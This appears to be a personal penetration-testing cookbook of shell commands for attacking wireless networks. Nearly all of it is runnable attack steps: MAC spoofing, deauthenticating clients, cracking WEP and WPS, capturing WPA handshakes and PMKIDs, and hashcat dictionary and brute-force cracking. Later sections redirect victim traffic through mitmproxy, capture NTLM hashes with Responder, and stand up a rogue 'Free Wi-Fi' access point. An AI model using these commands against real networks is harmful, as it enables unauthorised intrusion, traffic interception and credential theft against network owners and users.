`` Network discovery

    ~$ iwlist wlan0 scan | grep -Ei "address|essid|frequency|cipher|authentication|ieee" 

`` Setting up

    ~# airmon-ng check kill
    ~# rfkill unblock all
    ~# ip link set wlan0 down

    -- Random MAC address but matching device type
    ~# macchanger -a wlan0

    -- Set to desired MAC address
    ~# macchanger -m 00:00:00:00:00:01 wlan0

    -- Setting monitor mode
    ~# iw dev wlan0 set type monitor

    -- Select channel of the target network
    ~# iw dev wlan0 set channel 11

    -- Verify settings
    ~# iw dev

    -- Test injection
    ~# aireplay-ng -9 wlan0

`` Client discovery (changes channel)

    -- 2.4Ghz
    ~# airodump-ng wlan0
    ~# hcxdumptool -s 2 -i wlan0 --do_rcascan

    -- 5Ghz
    ~# airodump-ng wlan0 --band a
    ~# hcxdumptool -s 3 -i wlan0 --do_rcascan
    
    -- 2.4Ghz and 5Ghz
    ~# hcxdumptool -s 4 -i wlan0 --do_rcascan

`` Helpers

    `` Back to managed mode

        ~# iw dev wlan0 set type managed

    `` Restarting services

        ~# systemctl start wpa_supplicant.service
        ~# systemctl start NetworkManager.service

    `` Boosting tx power

        ~# iw wlan0 set txpower fixed 3000

    `` Check manufacturer based on MAC

        ~$ ~/lib/pentesting-cookbook/bin/mac_oui.sh 00:00:00:00:00:00

    `` Convert pcap to Hashcat's hccapx format

        ~$ hcxpcaptool -o out.hccapx out.pcap

        -- Write strings to `wordlist` in case the traffic contained clear-text passwords
        ~$ hcxpcaptool -o out.hccapx -E wordlist out.pcap

        -- Verify output
        ~$ wlanhcxinfo -i out.hccapx

`` Attacks

    -- AP: 00:00:00:00:00:00
    -- Client: 00:00:00:00:00:01

    `` WEP

        `` wifite2 powered by deauth/replay (works better than with internal deauth)

            -- [1] Start attack on WEP network
            ~# wifite -i wlan0 --keep-ivs

            -- (?) Try fake authentication if not started by wifite
            ~# aireplay-ng -1 6000 -o 1 -q 10 -a 00:00:00:00:00:00 -h 00:00:00:00:00:01 wlan0

            -- [2] Start ARP-request replay
            ~# aireplay-ng -3 -b 00:00:00:00:00:00 wlan0

            -- [3] Deauth specific client on the target network until ARP requests captured
            ~# aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 00:00:00:00:00:01 wlan0

            -- (?) Improve results with packet broadcasting
            ~# aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b 00:00:00:00:00:00 -h 00:00:00:00:00:01 wlan0

            -- (?) Improve results with caffe-latte attack
            ~# aireplay-ng -6 -b 00:00:00:00:00:00 wlan0

        `` besside-ng

            -- Works but slow compared to the wifite approach
            ~# besside-ng -b 00:00:00:00:00:00 wlan0

        `` wesside-ng

            -- Unreliable

    `` WPS

        `` wash / reaver

            -- [1] Find the target
            ~# wash -i wlan0

            -- [2] Crack
            ~# reaver -i wlan0 -b 00:00:00:00:00:00 -c 11 -vv -K
            
            -- Retrieve passphrase using PIN
            ~# reaver -i wlan0 -b 00:00:00:00:00:00 -s y -vv -p 00000000

        `` Device model using Wireshark
        
            - Filter: (wps.device_name != "" || wps.model_name != "" || wps.model_number != "")
            - In Tag: Vendor [...] WPS
                - Manufacturer: TP-Link
                - Model Name: TL-WR841N
                - Device Name: Wireless N Router TL-WR841N

    `` WPA

        `` Capturing WPA/WPA2 handshake (the "classic" approach with aircrack-ng)

            -- First console
            ~# airodump-ng --channel 6 --bssid 00:00:00:00:00:00 --output-format pcap -w out wlan0

            -- Second console
            ~# aireplay-ng -0 2 -a 00:00:00:00:00:00 -c 00:00:00:00:00:01 wlan0

            -- Finally
            ~$ aircrack-ng -w VAR_WORDLIST out.pcap

        `` WPA/WPA2 with hcxtools

            ~# hcxdumptool -i wlan0 -o out.pcapng --filterlist_ap=filter --filtermode=1 --stop_client_m2_attacks=3 --enable_status=15 -c 11
            ~$ hcxpcapngtool -o out.hc22000 out.pcapng

            -- Note it is preferred to use 22000 format instead of 2500 and 16800 modes, see: https://hashcat.net/forum/thread-10253.html
            -- Use --filterlist_ap and --filterlist_client arguments and provide the MAC adress or list of devices to be _protected_ or _targeted_ during the attack. The --filtermode argument can be used to define the MAC adress or list as _protected_ (1) or _targeted_ (2). Be aware of the MAC adress randomization. Accepted MAC address format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66.
            -- The Berkeley Packet Filter also can be used to define targeted/protected devices, argumnet: --bpfc=attack.bpf

        `` Deauth all stations for given AP

            ~# aireplay-ng wlan0 -0 2 -a 00:00:00:00:00:00

        `` Deauth specific client (works better than deauthing all)

            ~# macchanger -m 00:00:00:00:00:01 wlan0
            ~# aireplay-ng -0 2 -a 00:00:00:00:00:00 -c 00:00:00:00:00:01 -D wlan0

        `` PMKID capture (the "new" way aka "client-less attack", 802.11 i/p/q/r)

            -- (Airmon-ng is not recommended to be used in combination with hcxdumptool, put the interface back to managed mode)
            -- (Better to use filtermode=1 and _exclude_ devices, might miss some good frames otherwise)

            ~# hcxdumptool -i wlan0 -c 11 --enable_status=15 --filterlist_ap=filter --filtermode=2 --disable_client_attacks -o wpa.pcapng
            ~$ hcxpcapngtool -o wpa.hc22000 wpa.pcapng

        `` wifite (the "new" way with PMKID capture by default)

            ~# wifite -i wlan0 -b 00:00:00:00:00:00

        `` besside-ng (the "old" way)

            -- Capture WPA handshake and deauth
            ~# besside-ng -b 00:00:00:00:00:00 -c 11 wlan0

            -- Convert to a hashcat capture file
            ~$ hcxpcapngtool -o wpa.hc22000 wpa.pcapng

            -- Dictionary attack
            ~$ hashcat -m 22000 wpa.hc22000 VAR_WORDLIST

        `` Cracking

            -- Dictionary attack
            ~$ hashcat -m 22000 wpa.hc22000 VAR_WORDLIST

            -- Dictionary attack with combinations (hashcat rules)
            ~$ hashcat -m 22000 -r /usr/share/hashcat/rules/best64.rule wpa.hc22000 VAR_WORDLIST

            -- Bruteforce attack
            ~$ hashcat -m 22000 wpa.hc22000 -a 3 -O -w 3 -1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1?1?1

        `` Lucky approach

            -- Hop between channels, stay 5 seconds on each
            ~# hcxdumptool -i wlan0 -o wpa.pcapng -t 5 --enable_status=1

`` Routing, injection and NTLM

    ~# route del default
    ~# route add default gw $_IP wlan0
    ~# iptables -A INPUT -j LOG
    ~# echo 1 > /proc/sys/net/ipv4/ip_forward
    ~# iptables -F
    ~# iptables -t nat -F
    ~# iptables -t nat -A PREROUTING -i wlan0 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
    ~# iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    ~# mitmproxy --mode transparent -s $_FILE.py --listen-host $_IP
    ~# responder -I wlan0 -wF

`` CLI configuration

    ~$ vim wireless.config
        ctrl_interface=/var/run/wpa_supplicant
        ctrl_interface_group=0
        update_config=1
        network={
            ssid="VAR_STRING"
            psk="VAR_STRING"
        }
    ~# wpa_supplicant -D wext -i wlan0 -c wireless.config
    ~# dhclient wlan0

`` IPv6 AP

    ~# cat > /etc/radvd.conf << EOF
    interface br-wlan-ipv6 {
        AdvSendAdvert on;
        MinRtrAdvInterval 3;
        MaxRtrAdvInterval 10;
        prefix fd13:37::/32 {
            AdvOnLink on;
            AdvAutonomous on;
            AdvRouterAddr on;
        };
    };
    EOF
    ~$ cat > hostapd.conf << EOF
    interface=wlan0
    bridge=br-wlan-ipv6
    hw_mode=g
    channel=10
    wmm_enabled=1
    ssid=Free Wi-Fi
    auth_algs=1
    wpa=2
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    wpa_passphrase=somepassword
    EOF
    ~# ip link set wlan0 down
    ~# macchanger -A wlan0
    ~# ip link set wlan0 up
    ~# ip link add name br-wlan-ipv6 type bridge
    ~# ip address add fd13:37::1 dev br-wlan-ipv6
    ~# ip link set br-wlan-ipv6 up
    ~# hostapd ./hostapd.conf
